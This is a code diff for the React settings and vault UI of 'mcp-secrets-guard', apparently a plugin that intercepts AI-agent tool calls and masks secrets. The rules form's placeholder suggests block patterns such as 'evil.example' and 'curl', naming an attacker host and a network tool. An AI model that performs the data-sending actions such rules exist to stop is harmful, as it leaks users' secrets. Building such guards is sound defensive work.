+      h("input", {
+        className: "yg-input", type: "password", autoComplete: "off",
+        placeholder: currentLang === "ru" ? "Значение секрета (пароль, токен, приватный ключ)" : "Paste the secret value",
+        value: secret, onChange: function (e) { setSecret(e.target.value); }
+      }),
       h("div", { className: "yg-kinds", role: "radiogroup", "aria-label": "Kind of secret" },
         KINDS.map(function (k) {
-          return h("button", { key: k[0], type: "button", role: "radio", "aria-checked": label === k[0],
-            className: "yg-kind" + (label === k[0] ? " on" : ""), onClick: function () { setLabel(k[0]); } }, k[1]);
+          return h("button", {
+            key: k[0], type: "button", role: "radio", "aria-checked": label === k[0],
+            className: "yg-kind" + (label === k[0] ? " on" : ""),
+            onClick: function () { setLabel(k[0]); }
+          }, k[1]);
         })),
       h("div", { className: "yg-actions" },
-        h("button", { className: "yg-btn", disabled: busy || !secret, onClick: save }, busy ? "Encrypting…" : "Protect this secret")),
+        h("button", {
+          className: "yg-btn", disabled: busy || !secret || !title.trim(),
+          onClick: save
+        }, busy ? (currentLang === "ru" ? "Шифрование…" : "Encrypting…") : (currentLang === "ru" ? "Защитить этот секрет" : "Protect this secret"))),
       h("div", { className: "yg-actions" },
-        h("label", { className: "yg-btn ghost" }, "Add a file",
+        h("label", { className: "yg-btn ghost" }, currentLang === "ru" ? "Добавить файл" : "Add a file",
           h("input", { type: "file", style: { display: "none" }, onChange: function (e) { addFile(e.target.files && e.target.files[0]); e.target.value = ""; } })),
         h("span", { className: "yg-dim yg-small" }, "Up to 10 MB: .env, keys, wallet files, documents.")),
       msg ? h("div", { className: msg.ok ? "yg-ok yg-small" : "yg-err yg-small" }, msg.text) : null,
-      h("div", { className: "yg-sub" }, "Protected: " + live.length),
+      h("div", { className: "yg-sub" }, (currentLang === "ru" ? "Под защитой: " : "Protected: ") + live.length),
       live.map(function (v) { return h(VaultItem, { key: v.token, v: v, op: op, busy: busy }); }),
-      trash.length ? h("details", { className: "yg-gaps" }, h("summary", null, "Trash (" + trash.length + ")"),
+      trash.length ? h("details", { className: "yg-gaps" }, h("summary", null, (currentLang === "ru" ? "Корзина (" : "Trash (") + trash.length + ")"),
         h("div", { className: "yg-dim yg-small" }, "Items in the trash are deleted for good after 30 days. While in the trash, agents cannot use them."),
         trash.map(function (v) {
           return h("div", { className: "yg-row", key: v.token },
             h(Chip, { label: { id: v.label, label: v.title || v.filename || v.label } }),
             h("span", { className: "yg-dim yg-small" }, ago(v.deleted)),
             h("button", { className: "yg-btn ghost", disabled: busy, onClick: function () { op({ op: "restore", token: v.token }, "Restored."); } }, "Restore"),
-            h("button", { className: "yg-btn bad", disabled: busy, onClick: function () {
-              if (window.confirm(T("Delete forever? This cannot be undone."))) op({ op: "purge", token: v.token }, "Deleted forever.");
-            } }, "Delete forever"));
+            h("button", {
+              className: "yg-btn bad", disabled: busy, onClick: function () {
+                if (window.confirm(T("Delete forever? This cannot be undone."))) op({ op: "purge", token: v.token }, "Deleted forever.");
+              }
+            }, "Delete forever"));
         })) : null);
   }
 
@@ -1607,7 +1519,7 @@
     const [menuOpen, setMenuOpen] = useState(false);
     const menuRef = useRef(null);
     function done() { setMode(""); setVal(""); setMenuOpen(false); }
-    // Close menu when clicking outside or pressing Escape
+
     useEffect(function () {
       if (!menuOpen) return;
       function handleClick(e) { if (menuRef.current && !menuRef.current.contains(e.target)) setMenuOpen(false); }
@@ -1619,56 +1531,374 @@
         document.removeEventListener("keydown", handleKey);
       };
     }, [menuOpen]);
+
+    const friendlyName = v.title || v.filename || (v.token ? v.token.slice(0, 16) + "…" : "Секрет");
+
     return h("div", { className: "yg-inc done" },
       h("div", { className: "yg-inc-top" },
-        h(Chip, { label: { id: v.label, label: v.title || v.filename || v.label } }),
-        h("span", { className: "yg-dim yg-small" }, v.kind === "file" ? T("file") + " · " + fmtSize(v.size || 0) : (v.token ? v.token.slice(0, 12) + "…" : T("text"))),
-        h("span", { className: "yg-dim yg-small" }, v.source === "runtime-quarantine" ? "quarantined from an agent" : "added by you"),
+        h(Chip, { label: { id: v.label, label: v.label } }),
+        h("b", { style: { color: "#ffd700", fontSize: "12.5px" } }, friendlyName),
+        h("span", { className: "yg-dim yg-mono yg-small" }, v.token ? v.token.slice(0, 18) + "…" : ""),
         h("span", { className: "yg-dim yg-small yg-right" }, ago(v.changed || v.created)),
-        // One compact ⋮ per row; all four actions live in the dropdown.
         mode ? null : h("div", { ref: menuRef, className: "yg-vault-menu", style: { position: "relative" } },
-          h("button", { type: "button", className: "yg-vault-menu-btn", disabled: p.busy,
-            title: "Actions for this secret", "aria-label": "Actions for this secret",
-            "aria-haspopup": "menu", "aria-expanded": menuOpen,
-            onClick: function () { setMenuOpen(!menuOpen); } }, "⋮"),
-          h("button", { type: "button", className: "yg-vault-menu-btn yg-vault-trash-btn", disabled: p.busy,
-            title: v.deleted ? T("Delete forever") : T("Move to trash"), "aria-label": v.deleted ? T("Delete forever") : T("Move to trash"),
+          h("button", {
+            type: "button", className: "yg-vault-menu-btn", disabled: p.busy,
+            title: "Actions", onClick: function () { setMenuOpen(!menuOpen); }
+          }, "⋮"),
+          h("button", {
+            type: "button", className: "yg-vault-menu-btn yg-vault-trash-btn", disabled: p.busy,
+            title: v.deleted ? T("Delete forever") : T("Move to trash"),
             onClick: function () {
               if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                 p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
-            } }, "🗑"),
+            }
+          }, "🗑"),
           menuOpen ? h("div", { className: "yg-vault-menu-dropdown", role: "menu" },
-            h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { setVal(v.title || ""); setMode("rename"); } }, "✏ Rename"),
-            h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-              onClick: function () { setMode("kind"); } }, "🏷 Change kind"),
+            h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { setVal(v.title || ""); setMode("rename"); }
+            }, currentLang === "ru" ? "✏ Переименовать" : "✏ Rename"),
+            h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item",
+              onClick: function () { setMode("kind"); }
+            }, currentLang === "ru" ? "🏷 Сменить категорию" : "🏷 Change kind"),
             v.kind === "file"
-              ? h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-                onClick: function () { p.op({ op: "save", token: v.token }, "Saved a copy to Downloads."); done(); } }, "⬇ Save a copy to Downloads")
-              : h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item",
-                onClick: function () { setMode("replace"); } }, "↻ Replace value"),
-            h("button", { type: "button", role: "menuitem", className: "yg-vault-menu-item" + (v.deleted ? " bad" : ""),
+              ? h("button", {
+                type: "button", role: "menuitem", className: "yg-vault-menu-item",
+                onClick: function () { p.op({ op: "save", token: v.token }, "Saved a copy to Downloads."); done(); }
+              }, currentLang === "ru" ? "⬇ Сохранить копию в Загрузки" : "⬇ Save copy to Downloads")
+              : h("button", {
+                type: "button", role: "menuitem", className: "yg-vault-menu-item",
+                onClick: function () { setMode("replace"); }
+              }, currentLang === "ru" ? "↻ Заменить значение" : "↻ Replace value"),
+            h("button", {
+              type: "button", role: "menuitem", className: "yg-vault-menu-item" + (v.deleted ? " bad" : ""),
               onClick: function () {
                 if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                   p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
                 done();
-              } }, "🗑 " + T(v.deleted ? "Delete forever" : "Move to trash"))) : null)),
+              }
+            }, "🗑 " + T(v.deleted ? "Delete forever" : "Move to trash"))
+          ) : null)
+      ),
       mode === "rename" ? h("div", { className: "yg-actions" },
         h("input", { className: "yg-input", value: val, placeholder: "New name", onChange: function (e) { setVal(e.target.value); } }),
         h("button", { className: "yg-btn", disabled: p.busy || !val.trim(), onClick: function () { p.op({ op: "rename", token: v.token, title: val }, "Renamed."); done(); } }, "Save"),
         h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
       mode === "replace" ? h("div", { className: "yg-actions" },
-        h("input", { className: "yg-input", type: "password", autoComplete: "off", value: val, placeholder: "New value",
-          onChange: function (e) { setVal(e.target.value); } }),
+        h("input", { className: "yg-input", type: "password", autoComplete: "off", value: val, placeholder: "New value", onChange: function (e) { setVal(e.target.value); } }),
         h("button", { className: "yg-btn", disabled: p.busy || !val, onClick: function () { p.op({ op: "replace", token: v.token, secret: val }, "Value replaced. Agents keep the same token."); done(); } }, "Save"),
         h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
       mode === "kind" ? h("div", { className: "yg-kinds" },
         KINDS.map(function (k) {
-          return h("button", { key: k[0], type: "button", className: "yg-kind" + (v.label === k[0] ? " on" : ""),
-            onClick: function () { p.op({ op: "relabel", token: v.token, label: k[0] }, "Kind changed."); done(); } }, k[1]);
-        }), h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null);
+          return h("button", {
+            key: k[0], type: "button", className: "yg-kind" + (v.label === k[0] ? " on" : ""),
+            onClick: function () { p.op({ op: "relabel", token: v.token, label: k[0] }, "Kind changed."); done(); }
+          }, k[1]);
+        }), h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null
+    );
   }
 
+  // =========================================================================
+  // TASK 2: TAB 5 — SETTINGS & MULTI-AGENT HUB
+  // =========================================================================
+  function SettingsPanel() {
+    const [rules, setRules] = useState([]);
+    const [busyRule, setBusyRule] = useState("");
+    const [action, setAction] = useState("block");
+    const [matchType, setMatchType] = useState("domain");
+    const [match, setMatch] = useState("");
+    const [failClosed, setFailClosed] = useState(true);
+    const [notifyEnabled, setNotifyEnabled] = useState(true);
+    const [arenaFps, setArenaFps] = useState("full");
+
+    function loadRules() {
+      SDK.fetchJSON(API + "/rules")
+        .then(function (r) { if (r.status === "ok") setRules(r.items || []); })
+        .catch(function () {});
+    }
+
+    useEffect(function () {
+      loadRules();
+      SDK.fetchJSON(API + "/config")
+        .then(function (r) {
+          if (r.status === "ok" && r.config) {
+            if (r.config.arena_mode) setArenaFps(r.config.arena_mode);
+            if (r.config.fail_closed !== undefined) setFailClosed(r.config.fail_closed);
+            if (r.config.notifications !== undefined) setNotifyEnabled(r.config.notifications);
+          }
+        }).catch(function () {});
+    }, []);
+
+    function addRule() {
+      if (!match.trim()) return;
+      setBusyRule("add");
+      post("/rules", { action: action, match_type: matchType, match: match.trim() })
+        .then(function (r) {
+          setBusyRule("");
+          if (r.status === "ok") { setMatch(""); loadRules(); }
+          else window.alert(r.message || "Failed to add rule.");
+        })
+        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
+    }
+
+    function delRule(id, m) {
+      setBusyRule(id || m);
+      post("/rules/delete", { id: id, match: m })
+        .then(function (r) {
+          setBusyRule("");
+          if (r.status === "ok") loadRules();
+          else window.alert(r.message || "Failed to delete rule.");
+        })
+        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
+    }
+
+    function toggleFailClosed(val) {
+      setFailClosed(val);
+      post("/config", { fail_closed: val }).catch(function () {});
+    }
+
+    function toggleNotify(val) {
+      setNotifyEnabled(val);
+      post("/config", { notifications: val }).catch(function () {});
+    }
+
+    function toggleArena(modeVal) {
+      setArenaFps(modeVal);
+      post("/config", { arena_mode: modeVal }).catch(function () {});
+    }
+
+    const standaloneUrl = "http://127.0.0.1:8765/";
+    const mcpConfigJson = JSON.stringify({
+      mcpServers: {
+        "secrets-guard": {
+          command: "python",
+          args: ["-m", "src.runtime.policy", "--mcp"],
+          env: { MCP_SECRETS_GUARD: "1" }
+        }
+      }
+    }, null, 2);
+
+    return h(React.Fragment, null,
+      // Section 1: Language & Interface
+      h(Card, { title: currentLang === "ru" ? "язык и интерфейс" : "language & interface", className: "wide" },
+        h("div", { style: { display: "flex", gap: 16, flexWrap: "wrap", alignItems: "center" } },
+          h("div", { style: { flex: "1 1 200px" } },
+            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Язык интерфейса" : "Interface Language"),
+            h("div", { className: "yg-kinds" },
+              h("button", {
+                type: "button", className: "yg-kind" + (currentLang === "ru" ? " on" : ""),
+                onClick: function () { setLanguage("ru"); }
+              }, "Русский (RU)"),
+              h("button", {
+                type: "button", className: "yg-kind" + (currentLang === "en" ? " on" : ""),
+                onClick: function () { setLanguage("en"); }
+              }, "English (EN)")
+            )),
+          h("div", { style: { flex: "1 1 220px" } },
+            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Анимация кибер-арены" : "Cyber Arena Animation"),
+            h("div", { className: "yg-kinds" },
+              h("button", {
+                type: "button", className: "yg-kind" + (arenaFps === "full" ? " on" : ""),
+                onClick: function () { toggleArena("full"); }
+              }, currentLang === "ru" ? "Активна (60 FPS)" : "Active (60 FPS)"),
+              h("button", {
+                type: "button", className: "yg-kind" + (arenaFps === "compact" ? " on" : ""),
+                onClick: function () { toggleArena("compact"); }
+              }, currentLang === "ru" ? "Компактный режим" : "Compact Mode")
+            )),
+          h("div", { style: { flex: "1 1 220px" } },
+            h("div", { className: "yg-sub" }, currentLang === "ru" ? "Уведомления Windows" : "Windows Notifications"),
+            h("div", { className: "yg-kinds" },
+              h("button", {
+                type: "button", className: "yg-kind" + (notifyEnabled ? " on" : ""),
+                onClick: function () { toggleNotify(true); }
+              }, currentLang === "ru" ? "Включены" : "Enabled"),
+              h("button", {
+                type: "button", className: "yg-kind" + (!notifyEnabled ? " on" : ""),
+                onClick: function () { toggleNotify(false); }
+              }, currentLang === "ru" ? "Отключены" : "Disabled")
+            ))
+        )
+      ),
+
+      // Section 2: Protection Policy
+      h(Card, { title: currentLang === "ru" ? "политика защиты по умолчанию" : "default protection policy", className: "wide" },
+        h("div", { style: { display: "flex", gap: 12, flexWrap: "wrap" } },
+          h("div", {
+            className: "yg-card",
+            style: { flex: 1, cursor: "pointer", borderColor: failClosed ? "var(--yg-good)" : "var(--yg-border)" },
+            onClick: function () { toggleFailClosed(true); }
+          },
+            h("div", { style: { display: "flex", alignItems: "center", gap: 6, fontWeight: 700 } },
+              h("span", { style: { color: failClosed ? "var(--yg-good)" : "inherit" } }, failClosed ? "●" : "○"),
+              currentLang === "ru" ? "Строгий (Fail-closed) — Рекомендуется" : "Strict (Fail-closed) — Recommended"),
+            h("div", { className: "yg-dim yg-small", style: { marginTop: 6 } },
+              currentLang === "ru"
+                ? "Блокировать любые подозрительные вызовы до явного решения пользователя. Агент ожидает подтверждения."
+                : "Block any risky action until user explicitly decides. Agent waits for mandate.")
+          ),
+          h("div", {
+            className: "yg-card",
+            style: { flex: 1, cursor: "pointer", borderColor: !failClosed ? "var(--yg-accent)" : "var(--yg-border)" },
+            onClick: function () { toggleFailClosed(false); }
+          },
+            h("div", { style: { display: "flex", alignItems: "center", gap: 6, fontWeight: 700 } },
+              h("span", { style: { color: !failClosed ? "var(--yg-accent)" : "inherit" } }, !failClosed ? "●" : "○"),
+              currentLang === "ru" ? "Авто-маскировка секретов (Auto-Vault)" : "Auto-Vault Masking"),
+            h("div", { className: "yg-dim yg-small", style: { marginTop: 6 } },
+              currentLang === "ru"
+                ? "Автоматически заменять известные секреты из Сейфа на безопасные токены msg_tok_... и отправлять без задержки."
+                : "Automatically replace known secrets from Vault with msg_tok_... and send without prompting.")
+          )
+        )
+      ),
+
+      // Section 3: Universal Multi-Agent Hub
+      h(Card, { title: currentLang === "ru" ? "центр подключения агентов (multi-agent hub)" : "multi-agent hub", className: "wide" },
+        h("div", { className: "yg-dim yg-small" },
+          currentLang === "ru"
+            ? "Плагин mcp-secrets-guard работает как внутри Hermes Desktop, так и с любыми другими ИИ-агентами через протокол MCP или автономный веб-пульт."
+            : "mcp-secrets-guard integrates natively with Hermes Desktop and connects to any other AI agents via Model Context Protocol or standalone web dashboard."),
+        // Standalone Web Dashboard Address Bar
+        h("div", { style: { display: "flex", gap: 8, alignItems: "center", margin: "10px 0", background: "rgba(0,0,0,0.4)", padding: "8px 12px", borderRadius: 6, border: "1px solid var(--yg-border)" } },
+          h("span", { style: { color: "var(--yg-good)", fontWeight: 700 } }, "🌐 " + (currentLang === "ru" ? "Локальный веб-пульт: " : "Standalone Web URL: ")),
+          h("code", { className: "yg-mono", style: { color: "#67e8f9", flex: 1 } }, standaloneUrl),
+          h("button", {
+            type: "button", className: "yg-btn ghost",
+            onClick: function () { copyText(standaloneUrl); }
+          }, currentLang === "ru" ? "Скопировать URL" : "Copy URL")
+        ),
+        // Agent Cards Grid
+        h("div", { className: "yg-hub-grid" },
+          // Hermes Card
+          h("div", { className: "yg-hub-card" },
+            h("div", { className: "yg-hub-title" }, "⚡ Hermes Agent"),
+            h("div", { className: "yg-hub-desc" },
+              currentLang === "ru" ? "Установлен как встроенный плагин десктопа. Перехватывает вызовы на лету." : "Active as desktop plugin. Intercepts tool calls on the fly."),
+            h("div", { className: "yg-hub-pre" }, "C:\\Users\\vades\\AppData\\Local\\hermes\\plugins\\yadro-guard"),
+            h("button", {
+              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
+              onClick: function () { copyText("C:\\Users\\vades\\AppData\\Local\\hermes\\plugins\\yadro-guard"); }
+            }, currentLang === "ru" ? "Скопировать путь" : "Copy Path")
+          ),
+          // Cline Card
+          h("div", { className: "yg-hub-card" },
+            h("div", { className: "yg-hub-title" }, "🤖 Cline (VS Code)"),
+            h("div", { className: "yg-hub-desc" },
+              currentLang === "ru" ? "Добавьте в cline_mcp_settings.json для проверки всех команд терминала." : "Add to cline_mcp_settings.json to audit all terminal commands."),
+            h("div", { className: "yg-hub-pre" }, "\"secrets-guard\": { \"command\": \"python\", \"args\": [\"-m\", \"src.runtime.policy\", \"--mcp\"] }"),
+            h("button", {
+              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
+              onClick: function () { copyText(mcpConfigJson); }
+            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
+          ),
+          // Claude Desktop Card
+          h("div", { className: "yg-hub-card" },
+            h("div", { className: "yg-hub-title" }, "🔮 Claude Desktop / Claude Code"),
+            h("div", { className: "yg-hub-desc" },
+              currentLang === "ru" ? "Вставьте в claude_desktop_config.json для защиты API-ключей и файлов." : "Add to claude_desktop_config.json to shield keys and files."),
+            h("div", { className: "yg-hub-pre" }, "%APPDATA%\\Claude\\claude_desktop_config.json"),
+            h("button", {
+              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
+              onClick: function () { copyText(mcpConfigJson); }
+            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
+          ),
+          // Cursor Card
+          h("div", { className: "yg-hub-card" },
+            h("div", { className: "yg-hub-title" }, "💻 Cursor"),
+            h("div", { className: "yg-hub-desc" },
+              currentLang === "ru" ? "Подключение через Cursor Features → MCP Servers." : "Connect via Cursor Features → MCP Servers."),
+            h("div", { className: "yg-hub-pre" }, ".cursor/mcp.json"),
+            h("button", {
+              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
+              onClick: function () { copyText(mcpConfigJson); }
+            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
+          ),
+          // Windsurf Card
+          h("div", { className: "yg-hub-card" },
+            h("div", { className: "yg-hub-title" }, "🌊 Windsurf"),
+            h("div", { className: "yg-hub-desc" },
+              currentLang === "ru" ? "Подключение в .codeium/windsurf/mcp_config.json." : "Configure in .codeium/windsurf/mcp_config.json."),
+            h("div", { className: "yg-hub-pre" }, "~/.codeium/windsurf/mcp_config.json"),
+            h("button", {
+              type: "button", className: "yg-btn ghost", style: { alignSelf: "flex-start" },
+              onClick: function () { copyText(mcpConfigJson); }
+            }, currentLang === "ru" ? "Скопировать конфиг MCP" : "Copy MCP Config")
+          )
+        )
+      ),
+
+      // Section 4: Persistent Rules Management
+      h(Card, { title: currentLang === "ru" ? "управление постоянными правилами" : "persistent rules management", className: "wide" },
+        h("div", { className: "yg-dim yg-small" },
+          currentLang === "ru"
+            ? "Белые и чёрные списки доменов и инструментов, запомненные пользователем. Правила применяются автоматически до запуска инструментов."
+            : "Whitelists and blacklists of domains and tools remembered by user. Applied automatically before tool calls."),
+        // Add Rule Form
+        h("div", { style: { display: "flex", gap: 8, marginTop: 10, flexWrap: "wrap", alignItems: "center" } },
+          h("select", {
+            className: "yg-input", style: { flex: "0 0 160px" },
+            value: action, onChange: function (e) { setAction(e.target.value); }
+          },
+            h("option", { value: "block" }, currentLang === "ru" ? "⛔ Блокировать" : "⛔ Block"),
+            h("option", { value: "allow" }, currentLang === "ru" ? "✓ Разрешать" : "✓ Allow")
+          ),
+          h("select", {
+            className: "yg-input", style: { flex: "0 0 160px" },
+            value: matchType, onChange: function (e) { setMatchType(e.target.value); }
+          },
+            h("option", { value: "domain" }, currentLang === "ru" ? "Домен (host)" : "Domain (host)"),
+            h("option", { value: "tool" }, currentLang === "ru" ? "Инструмент (tool)" : "Tool name")
+          ),
+          h("input", {
+            className: "yg-input", style: { flex: 1 },
+            placeholder: currentLang === "ru" ? "Шаблон (например: evil.example или curl)" : "Pattern (e.g. evil.example or curl)",
+            value: match, onChange: function (e) { setMatch(e.target.value); }
+          }),
+          h("button", {
+            type: "button", className: "yg-btn", disabled: busyRule === "add" || !match.trim(),
+            onClick: addRule
+          }, busyRule === "add" ? "…" : (currentLang === "ru" ? "Добавить правило" : "Add Rule"))
+        ),
+        // Rules Table
+        rules.length ? h("table", { className: "yg-table" },
+          h("thead", null,
+            h("tr", null,
+              h("th", null, currentLang === "ru" ? "Действие" : "Action"),
+              h("th", null, currentLang === "ru" ? "Тип" : "Type"),
+              h("th", null, currentLang === "ru" ? "Шаблон совпадения" : "Match Pattern"),
+              h("th", null, currentLang === "ru" ? "Создано" : "Created"),
+              h("th", { style: { textAlign: "right" } }, currentLang === "ru" ? "Удалить" : "Delete")
+            )
+          ),
+          h("tbody", null,
+            rules.map(function (r, idx) {
+              return h("tr", { key: r.id || ("r" + idx) },
+                h("td", null, h(Pill, { kind: r.action === "block" ? "bad" : "ok" },
+                  r.action === "block" ? (currentLang === "ru" ? "Блокировать" : "Block") : (currentLang === "ru" ? "Разрешать" : "Allow"))),
+                h("td", { className: "yg-mono" }, r.match_type),
+                h("td", { className: "yg-mono", style: { color: "#67e8f9" } }, r.match),
+                h("td", { className: "yg-dim" }, r.created_at ? fmtTs(r.created_at) : "—"),
+                h("td", { style: { textAlign: "right" } },
+                  h("button", {
+                    type: "button", className: "yg-btn ghost yg-trash",
+                    disabled: busyRule === (r.id || r.match),
+                    title: "Delete",
+                    onClick: function () { delRule(r.id, r.match); }
+                  }, busyRule === (r.id || r.match) ? "…" : "🗑"))
+              );
+            })
+          )
+        ) : h("div", { className: "yg-dim yg-small", style: { marginTop: 10 } },
+          currentLang === "ru" ? "Постоянных правил пока нет." : "No persistent rules yet.")
+      )
+    );
+  }
+
+  // =========================================================================
+  // MAIN GUARD PAGE (Header RU|EN Switcher, 5 Tabs)
+  // =========================================================================
   function GuardPage() {
     const [tab, setTab] = useState("live");
     const [passportOpen, setPassportOpen] = useState(false);
@@ -1678,48 +1908,55 @@
     const [toast, setToast] = useState(null);
     const [toastBusy, setToastBusy] = useState("");
     const [toastNote, setToastNote] = useState("");
+    const [lang, setLangState] = useState(currentLang);
+
+    useEffect(function () {
+      function onLangChange(newLang) { setLangState(newLang); }
+      langListeners.add(onLangChange);
+      return function () { langListeners.delete(onLangChange); };
+    }, []);
+
     const alive = useRef(true);
-    const seen = useRef(null);      // pending ids already announced (null = nothing polled yet)
-    const queue = useRef([]);       // new pending incidents still waiting for their toast
-    const lastPending = useRef([]); // pending incidents as of the last poll
-    const toastRef = useRef(null);  // mirror of `toast`, readable from stable callbacks
+    const seen = useRef(null);
+    const queue = useRef([]);
+    const lastPending = useRef([]);
+    const toastRef = useRef(null);
     const baseTitle = useRef("");
+
     const showToast = useCallback(function (inc) {
       toastRef.current = inc; setToast(inc); setToastBusy(""); setToastNote("");
     }, []);
-    // Web Notifications: the toast lives inside the plugin, a notification follows the user
-    // to a minimized or backgrounded Hermes window.
+
     const notify = useCallback(function (inc) {
       try {
         if (typeof Notification === "undefined" || !Notification || Notification.permission !== "granted") return;
         const n = new Notification(T("mcp-secrets-guard blocked an agent"), {
-          body: T("Agent tried to use the tool") + " " + (inc.tool || "?") + " " + T("to send data to") + " " +
-            (inc.destination || "?") + ". " + T("Open Guard to allow or block it."),
+          body: (currentLang === "ru" ? "Агент попытался использовать инструмент " : "Agent tried to use tool ") +
+            (inc.tool || "?") + (currentLang === "ru" ? " для отправки данных в " : " to send data to ") +
+            (inc.destination || "?") + ". " + (currentLang === "ru" ? "Откройте Guard для решения." : "Open Guard to allow or block it."),
           tag: "yadro-guard",
         });
         n.onclick = function () { try { window.focus(); } catch (e) {} showToast(inc); };
-      } catch (e) { /* notifications are a bonus: never break the panel over one */ }
+      } catch (e) {}
     }, [showToast]);
-    // Drop the toast that is on screen and show the next blocked action, if any.
+
     const promote = useCallback(function () {
       const cur = toastRef.current;
       if (cur) queue.current = queue.current.filter(function (i) { return i.id !== cur.id; });
       if (queue.current.length) return showToast(queue.current[0]);
-      // Nothing queued (dismissed or already decided): fall back to what the last poll still
-      // reports as pending, so the counter pill can always bring a blocked action back.
       const rest = lastPending.current.filter(function (i) { return !cur || i.id !== cur.id; });
       showToast(rest.length ? rest[0] : null);
     }, [showToast]);
-    // Diff every poll: only ids that were not pending before raise a toast.
+
     const announce = useCallback(function (d) {
       const items = (d && d.items) || [];
       const pend = items.filter(function (i) { return i.status === "pending"; });
       lastPending.current = pend;
       const open = {};
       pend.forEach(function (i) { open[i.id] = i; });
-      queue.current = queue.current.filter(function (i) { return open[i.id]; });   // decided elsewhere
+      queue.current = queue.current.filter(function (i) { return open[i.id]; });
       const ids = pend.map(function (i) { return i.id; });
-      if (seen.current === null) { seen.current = ids; return; }   // first poll: never spam
+      if (seen.current === null) { seen.current = ids; return; }
       const fresh = pend.filter(function (i) { return seen.current.indexOf(i.id) < 0; });
       seen.current = ids;
       if (!fresh.length) return;
@@ -1727,39 +1964,44 @@
       notify(fresh[0]);
       if (!toastRef.current) promote();
     }, [notify, promote]);
+
     const refresh = useCallback(function () {
       SDK.fetchJSON(API + "/incidents").then(function (d) { if (alive.current) { setIncidents(d); announce(d); } })
         .catch(function () { if (alive.current) setIncidents({ status: "error", message: "Guard backend is not reachable." }); });
       SDK.fetchJSON(API + "/vault").then(function (d) { if (alive.current) setVault(d); }).catch(function () {});
     }, [announce]);
+
     useEffect(function () {
       alive.current = true; refresh();
       const t = setInterval(function () { if (!document.hidden) refresh(); }, POLL_MS);
       return function () { alive.current = false; clearInterval(t); };
     }, [refresh]);
-    // Ask once, quietly — there is no toast/notification at all without permission.
+
     useEffect(function () {
       try {
         if (typeof Notification !== "undefined" && Notification.permission === "default" && Notification.requestPermission)
           Notification.requestPermission();
       } catch (e) {}
     }, []);
+
     useEffect(function () { return function () { try { document.title = baseTitle.current || ""; } catch (e) {} }; }, []);
     const pending = incidents && incidents.pending ? incidents.pending : 0;
-    // The sidebar entry is registered by the host and cannot be badged from here, so the
-    // unresolved count also goes into the window title while something is waiting.
+
     useEffect(function () {
       try {
         if (!baseTitle.current) baseTitle.current = document.title;
-        document.title = pending ? "mcp-secrets-guard · " + pending + " заблокировано" : baseTitle.current;
+        document.title = pending
+          ? ("mcp-secrets-guard · " + pending + (currentLang === "ru" ? " заблокировано" : " blocked"))
+          : baseTitle.current;
       } catch (e) {}
     }, [pending]);
+
     useEffect(function () {
       if (!toast) return;
-      const t = setTimeout(promote, TOAST_MS);   // auto-dismiss; the counter stays
+      const t = setTimeout(promote, TOAST_MS);
       return function () { clearTimeout(t); };
     }, [toast, promote]);
-    // Same endpoint the incident card uses, so a toast decision lands in the same journal.
+
     function decide(choice) {
       const inc = toast;
       if (!inc) return;
@@ -1769,48 +2011,118 @@
           if (r.status === "ok") {
             lastPending.current = lastPending.current.filter(function (i) { return i.id !== inc.id; });
             refresh(); promote();
-          }
-          else { setToastBusy(""); setToastNote(r.message || "Could not save the decision."); }
+          } else { setToastBusy(""); setToastNote(r.message || "Could not save the decision."); }
         })
         .catch(function () { setToastBusy(""); setToastNote("Could not reach the Guard backend."); });
     }
+
+    const TAB_BADGE = {
+      display: "inline-block", background: "var(--yg-bad)", color: "#fff",
+      borderRadius: "999px", padding: "1px 6px", fontSize: "9px", fontWeight: "700", marginLeft: "4px"
+    };
+
     function TabBtn(id, text, badge) {
-      return h("button", { className: "yg-tab" + (tab === id ? " on" : ""), onClick: function () { setTab(id); },
-          title: badge ? badge + " unresolved" : undefined },
-        text, badge ? h("span", { className: "yg-tab-badge", style: TAB_BADGE }, "" + badge) : null);
+      return h("button", {
+        className: "yg-tab" + (tab === id ? " on" : ""),
+        onClick: function () { setTab(id); },
+        title: badge ? badge + " unresolved" : undefined
+      }, text, badge ? h("span", { className: "yg-tab-badge", style: TAB_BADGE }, "" + badge) : null);
     }
+
     return h("div", { className: "yg-root" },
       h("div", { className: "yg-top" },
-        h("span", { className: "yg-brand" }, h("span", { className: "yg-dot " + (pending ? "bad" : "ok") }), "mcp-secrets-guard"),
+        h("span", { className: "yg-brand" },
+          h("span", { className: "yg-dot " + (pending ? "bad" : "ok") }),
+          "mcp-secrets-guard"),
+        // Navigation Tabs (5 Tabs)
         h("div", { className: "yg-tabs" },
-          TabBtn("live", "Защита" + (pending ? " (" + pending + ")" : ""), pending),
-          TabBtn("exposure", "Порты"),
-          TabBtn("check", "Проверка кода"),
-          TabBtn("vault", "Сейф")),
